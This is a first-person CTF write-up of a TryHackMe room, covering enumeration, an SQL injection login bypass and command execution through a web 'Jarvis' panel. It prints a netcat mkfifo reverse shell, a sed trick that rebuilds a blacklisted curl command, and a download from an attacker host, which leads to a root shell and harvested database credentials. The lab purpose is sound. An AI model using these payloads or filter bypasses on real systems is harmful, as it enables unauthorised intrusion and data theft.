<html><head><meta content="text/html; charset=UTF-8" http-equiv="content-type"><style type="text/css">ol{margin:0;padding:0}table td,table th{padding:0}.c2{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c4{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c0{padding-top:0pt;padding-bottom:0pt;line-height:1.15;orphans:2;widows:2;text-align:left}.c7{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c5{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c8{color:inherit;text-decoration:inherit}.c3{font-weight:700}.c6{color:#a61c00}.c1{height:11pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c5"><p class="c0"><span class="c2">This was an interesting room from TryHackMe that taught basic SQLi injection. It was structured in a CTF format in which the student would achieve each flag from solving a task (more on this later). Although this box was structured in a way to guide the student, I like to try to complete the box without the hints provided by the questions, and rather than taking you through how to complete each task in sequential order as the author intended, I will explain how I went through this box. As a result, I went the extra mile when completing this box without realizing it! After completing this box, I read many write ups but not one mentioned the secret flag, and more interestingly, no write ups rooted the box (I only found out later that the author of this box did not intend for the student to root the box [perhaps the author did not realize how the RCE vulnerability could be exploited]). We will explore this more in detail further in this writeup.</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c2">As usual we will enumerate the machine with nmap -sC -sV -oA nmap/nmap &lt;victim ip&gt;. This may take a while so I have already ran it...ok I&#39;m not ippsec. Anyways, looking at the results we see the following:</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 244.00px;"><img alt="" src="images/image14.png" style="width: 624.00px; height: 244.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c2">Right off the bat we know this machine is running Ubuntu. All the services are up to date (during the time of writing which is Jan 2021).</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c2">Let&#39;s take a look at the http server!</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c2">Looking at the root page, we see a lot of comments by many avengers, but one in particular stands out:</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 104.00px;"><img alt="" src="images/image13.png" style="width: 624.00px; height: 104.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c2">Now this is an interesting comment that should be kept in mind. Before I started playing around with this website, I enumerated the directories of this http-server with gobuster (always have some kind of enum going on in the background).</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c3">gobuster dir -u http://&lt;victim ip&gt; -w &lt;wordlist&gt; -o &lt;output_file&gt;</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c2">I highly recommend checking out https://github.com/danielmiessler/SecLists , as there are a lot of useful wordlists that you can use to bruteforce directories, passwords, and usernames. For this box I used the raft-small-words.txt wordlist. </span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c2">While enumerating the directories, I looked at the source code for this html page and saw the following at the bottom:</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 376.00px; height: 18.00px;"><img alt="" src="images/image2.png" style="width: 376.00px; height: 18.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c2">Clicking on this script, we get the first flag. As a habit, you should look at the html source code, as it might leak some valuable information. </span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span>Looking at the gobuster results we see that </span><span class="c3">/portal</span><span class="c2">&nbsp;is an interesting directory. Going to this page we see the following: </span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 371.00px; height: 450.00px;"><img alt="" src="images/image15.png" style="width: 371.00px; height: 450.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c2">Looking at the html source code (see a pattern here?) we see an interesting comment:</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 469.00px; height: 18.00px;"><img alt="" src="images/image4.png" style="width: 469.00px; height: 18.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c2">SQLi stands for SQL injection and is a common problem that can have disastrous results in web servers. Thankfully, this vulnerability has been getting more publicized, and the frequency of successful attacks related to SQLi are decreasing. </span></p><p class="c0"><span>Typing </span><span class="c3">&lsquo; OR 1=1-- -</span><span class="c2">&nbsp;in the username and password, we get in!</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 603.50px; height: 174.17px;"><img alt="" src="images/image1.png" style="width: 603.50px; height: 174.17px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span>So...the developer though it would be a good idea to allow users to directly interact with the server through commands? Too easy, let&rsquo;s try an easy reverse shell using pentestmonkey (</span><span class="c7"><a class="c8" href="https://www.google.com/url?q=http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&amp;sa=D&amp;source=editors&amp;ust=1653956340026229&amp;usg=AOvVaw0wtnc8W3CDqlI9_pZsUQ9E">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></span><span class="c2">)</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c2">On the attacker machine:</span></p><p class="c0"><span class="c4 c3">nc -lvnp &lt;attacker port&gt;</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c2">On the Jarvis command line:</span></p><p class="c0"><span class="c4 c3">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;attacker ip&gt; &lt;attacker port&gt; &gt;/tmp/f</span></p><p class="c0 c1"><span class="c4 c3"></span></p><p class="c0"><span class="c2">Unfortunately, when we run this we receive an error message:</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 617.00px; height: 174.00px;"><img alt="" src="images/image16.png" style="width: 617.00px; height: 174.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c2">So let&rsquo;s just stick with harmless commands such as ls and cd so that we look around the files of this server. Let&rsquo;s see which files are in the directory we are in.</span></p><p class="c0 c1"><span class="c4 c3"></span></p><p class="c0"><span class="c2">Jarvis command:</span></p><p class="c0"><span class="c4 c3">ls</span></p><p class="c0 c1"><span class="c4 c3"></span></p><p class="c0"><span class="c2">Results:</span></p><p class="c0"><span class="c4 c3">create.sql</span></p><p class="c0"><span class="c4 c3">node_modules</span></p><p class="c0"><span class="c4 c3">package-lock.json</span></p><p class="c0"><span class="c4 c3">package.json</span></p><p class="c0"><span class="c4 c3">server.js</span></p><p class="c0"><span class="c4 c3">views</span></p><p class="c0 c1"><span class="c4 c3"></span></p><p class="c0"><span class="c2">Jarvis command:</span></p><p class="c0"><span class="c3 c4">cd ..;ls</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c2">Results:</span></p><p class="c0"><span class="c4 c3">avengers</span></p><p class="c0"><span class="c4 c3">flag5.txt</span></p><p class="c0"><span class="c2">&nbsp;</span></p><p class="c0"><span class="c2">After looking around we find the fifth flag (at this point I guessed I was supposed to find at least four flags by now). Cool, let&rsquo;s see the contents.</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c4 c3">cat ../flag5.txt</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c2">And we get hit with the same &ldquo;Command disallowed&rdquo; error that we got when we tried creating a reverse shell. I immediately started thinking of commands similar to cat such as head and tail, but neither worked. Eventually, I tried less which successfully revealed the contents of the fifth flag.</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c2">Now at this point, I didn&rsquo;t know that I wasn&rsquo;t supposed to go any further so I kept thinking of ways on how I would get a reverse shell. I tried many commands such as curl, bash, nc, perl, python, and many more commands. I was thinking about how it was possible to get a reverse shell without specifically typing any of these blacklisted strings. I came to the conclusion that if I could echo a string to a text file, and then somehow prepend text to it, then I could create a file that would contain a malicious command. Here is the methodology:</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c4 c3">echo &lsquo;url &lt;attacker ip&gt;/rev -o /tmp/reverse_shell&rsquo; &gt; /tmp/malicious_command</span></p><p class="c0"><span class="c4 c3">sed -i &#39;1s/^/cu/&#39; /tmp/test &nbsp; &nbsp; &larr; prepends the characters cu to /tmp/malicious_command</span></p><p class="c0"><span class="c4 c3">chmod +x /tmp/malicious_command</span></p><p class="c0"><span class="c2">Content of /tmp/malicious_command:</span></p><p class="c0"><span class="c4 c3">curl &lt;attacker ip&gt;/rev -o /tmp/rev </span></p><p class="c0 c1"><span class="c4 c3"></span></p><p class="c0"><span class="c2">Then, executing /tmp/rev would call the curl command make our malicious file be downloaded to the /tmp directory.</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c2">Let&rsquo;s try this out!</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c4 c3">less /tmp/malicious_command</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 612.00px; height: 149.00px;"><img alt="" src="images/image9.png" style="width: 612.00px; height: 149.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c2">Awesome! Let&rsquo;s set up a python http server on port 80 with a file called rev. This file can now hold the blacklist nc string as it is not being written to the Jarvis Command Line.</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c2">You can try many different reverse shells but I find this particular one to be the most reliable:</span></p><p class="c0"><span class="c4 c3">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;attacker ip&gt; &lt;attacker port&gt; &gt;/tmp/f</span></p><p class="c0 c1"><span class="c4 c3"></span></p><p class="c0"><span>Running </span><span class="c3">sudo python3 -m http.server 80</span><span>&nbsp;and executing </span><span class="c3">/tmp/malicious_command</span><span class="c2">&nbsp;we get a hit!</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c2">Looking at the content of /tmp we see these files now:</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 560.48px; height: 215.91px;"><img alt="" src="images/image17.png" style="width: 560.48px; height: 215.91px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c2">Now on our machine let&rsquo;s listen to the port that we specified in the reverse shell command.</span></p><p class="c0 c1"><span class="c4 c3"></span></p><p class="c0"><span class="c2">Jarvis commands:</span></p><p class="c0"><span class="c4 c3">chmod +x /tmp/rev; /tmp/rev</span></p><p class="c0 c1"><span class="c4 c3"></span></p><p class="c0"><span class="c2">And we get a reverse shell!</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 589.00px; height: 55.00px;"><img alt="" src="images/image3.png" style="width: 589.00px; height: 55.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span>No need to privesc! We are already root because the server was running as root! Now this is a huge vulnerability that is not too uncommon. </span><span class="c6">NEVER RUN YOUR WEB SERVERS AS ROOT!</span><span class="c2">&nbsp;It is better to run a web server as a low-privileged user such as www-data in case of any web vulnerabilities. So anyways, now that we have root I&rsquo;d call the box done. Let&rsquo;s just get the flags straight from the terminal.</span></p><p class="c0"><span class="c4 c3">find / 2&gt;/dev/null|grep -i flag|grep -i .txt</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 320.00px; height: 45.00px;"><img alt="" src="images/image11.png" style="width: 320.00px; height: 45.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c4 c3">grep -r flag2 /home</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 592.00px; height: 22.00px;"><img alt="" src="images/image12.png" style="width: 592.00px; height: 22.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c2">For task 6 view the html source code and scroll to the bottom. On the very left side of the screen is the number of lines of code.</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 46.67px;"><img alt="" src="images/image6.png" style="width: 624.00px; height: 46.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c2">So these are all the flags that the author wanted us to find when he published the room, but let&rsquo;s find the secret flag (something I stumbled on accidentally). I was curious on looking at the source code of the Jarvis command line to see which strings in particular are blacklisted. We strike a goldmine in /home/ubuntu/avengers/server.js</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 48.00px;"><img alt="" src="images/image5.png" style="width: 624.00px; height: 48.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c2">Now that explains why a lot of the commands we wanted did not work. Let&rsquo;s see what else this file has to offer:</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 391.00px; height: 140.00px;"><img alt="" src="images/image10.png" style="width: 391.00px; height: 140.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c2">We get credentials to the mysql server of this box! Now that saves a lot of time trying to reset the credentials. Let&rsquo;s check it out.</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 440.00px;"><img alt="" src="images/image8.png" style="width: 624.00px; height: 440.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 305.33px;"><img alt="" src="images/image7.png" style="width: 624.00px; height: 305.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c2">And we get the secret flag!</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c4 c3">flag4:sanitize_queries_mr_stark</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span>Looking at the SQL source code of the site (also located in /home/ubuntu/avengers/server.js) we see why the website was vulnerable to the SQLi.</span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 108.00px;"><img alt="" src="images/image18.png" style="width: 624.00px; height: 108.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span>The following line is particularly interesting:</span></p><p class="c0 c1"><span class="c4 c3"></span></p><p class="c0"><span class="c4 c3">// Made deliberately vulnerable.. Changed from con.query(&#39;SELECT * FROM users WHERE &nbsp; username = ? AND password = ?&#39;, [username, password]</span></p><p class="c0 c1"><span class="c4 c3"></span></p><p class="c0"><span class="c4 c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; con.query(&#39;SELECT * FROM users WHERE username = &#39; + username + &#39; AND password = &#39; + password, function(error, results, fields) {</span></p><p class="c0 c1"><span class="c4 c3"></span></p><p class="c0"><span class="c2">When we wrote &lsquo; OR 1=1-- - , the line looked like this:</span></p><p class="c0"><span class="c4 c3">con.query(&#39;SELECT * FROM users WHERE username = &#39;&#39;OR 1=1-- - + username + &#39; AND password = &#39; + password, function(error, results, fields) {</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c2">Note how the rest of the query is commented out using the dashes -- -. Essentially, the server was looking for a person whose username is blank, or true. Now nobody in the http server had a blank name so that would run false. However the OR statement is key! A false statement &ldquo;ORed&rdquo; with a true statement makes the statement true as a whole. For this reason, the login query ran true giving us access.</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0"><span class="c2">Overall, this was a very fun box with an interesting and unique way of rooting (although I don&rsquo;t think it was intended). This is my first writeup, and I hope you enjoyed reading it!</span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0 c1"><span class="c4 c3"></span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0 c1"><span class="c2"></span></p><p class="c0 c1"><span class="c2"></span></p></body></html>